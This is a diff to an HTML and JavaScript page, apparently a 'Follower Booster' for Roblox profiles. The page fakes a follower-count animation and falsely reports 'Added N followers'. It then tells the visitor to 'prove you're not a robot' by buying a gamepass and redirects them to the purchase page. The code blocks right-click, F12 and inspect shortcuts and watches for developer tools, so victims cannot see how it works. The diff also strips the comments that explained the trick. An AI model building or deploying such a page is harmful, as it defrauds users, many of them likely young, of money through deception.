@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emorea - Follower Boost</title>
+    <title>Follower Booster</title>
     <style>
         @font-face {
             font-family: 'sfregular';
@@ -155,14 +155,14 @@
         }
     </style>
 </head>
-<body oncontextmenu="return false;"> <!-- Disable right-click -->
+<body oncontextmenu="return false;">
     <div class="container">
         <h1>Follower Boost</h1>
         <input type="text" class="input-box" id="profileLink" placeholder="Paste your Roblox profile link" required>
         <select class="follower-select" id="followerAmount">
             <option value="1">1 Follower</option>
             <option value="1000">1000 Followers</option>
-            <option value="50000" selected>50,000 Followers (RISKY)</option>
+            <option value="50000" selected>5,000 Followers (RISKY)</option>
         </select>
         <button id="startButton" class="start-button" onclick="boostFollowers()">Start</button>
         <div class="response-area" id="responseArea">
@@ -177,7 +177,7 @@
     </div>
 
     <script>
-        // Disable keyboard shortcuts for inspecting
+
         document.onkeydown = function(e) {
             if (e.key === "F12" || 
                 (e.ctrlKey && e.shiftKey && e.key === "I") || 
@@ -186,7 +186,7 @@
             }
         };
 
-        // Optional: Alert if dev tools are detected (less reliable)
+
         function checkDevTools() {
             if (window.outerWidth - window.innerWidth > 200 || 
                 window.outerHeight - window.innerHeight > 200) {
@@ -204,7 +204,7 @@
             const followerCounter = document.getElementById('followerCounter');
             const startButton = document.getElementById('startButton');
 
-            // Validate profile link
+
             const userIdMatch = profileLink.match(/users\/(\d+)\/profile/);
             if (!profileLink || !userIdMatch) {
                 responseArea.style.display = 'block';
@@ -212,14 +212,14 @@
                 return;
             }
 
-            // Show loading screen
+
             loadingScreen.style.display = 'flex';
             responseArea.style.display = 'none';
 
-            // Animate follower counter based on selected amount
+
             let count = 0;
             const maxCount = followerAmount;
-            const increment = Math.max(1, Math.floor(maxCount / 20)); // Adjust increment for smooth animation
+            const increment = Math.max(1, Math.floor(maxCount / 20)); 
             const interval = setInterval(() => {
                 count += increment;
                 if (count >= maxCount) {
@@ -227,32 +227,32 @@
                     clearInterval(interval);
                 }
                 followerCounter.textContent = `+${count} followers`;
-            }, 100); // Increment every 100ms
+            }, 100); 
 
-            // Show result after "processing"
+
             setTimeout(() => {
                 loadingScreen.style.display = 'none';
                 responseArea.style.display = 'block';
-                startButton.style.display = 'none'; // Hide the Start button
+                startButton.style.display = 'none'; 
                 responseText.innerHTML = `Added ${followerAmount} followers! Prove you’re not a robot by <a onclick="verifyPurchase()">buying this gamepass</a>.`;
-            }, 3000); // 3-second "processing" time
+            }, 3000); 
         }
 
         function verifyPurchase() {
             const loadingScreen = document.getElementById('loadingScreen');
             const followerCounter = document.getElementById('followerCounter');
             const loadingText = document.getElementById('loadingText');
-            const gamepassUrl = 'https://www.roblox.com/game-pass/123'; // Replace with your Gamepass URL
+            const gamepassUrl = 'https://www.roblox.com/game-pass/123'; 
 
-            // Show "Waiting..." loading screen
+
             loadingScreen.style.display = 'flex';
             loadingText.textContent = 'Waiting...';
-            followerCounter.style.display = 'none'; // Hide counter during "Waiting"
+            followerCounter.style.display = 'none'; 
 
-            // Redirect after a short delay
+
             setTimeout(() => {
                 window.location.href = gamepassUrl;
-            }, 2000); // 2-second delay before redirect
+            }, 2000); 
         }
     </script>
 </body>
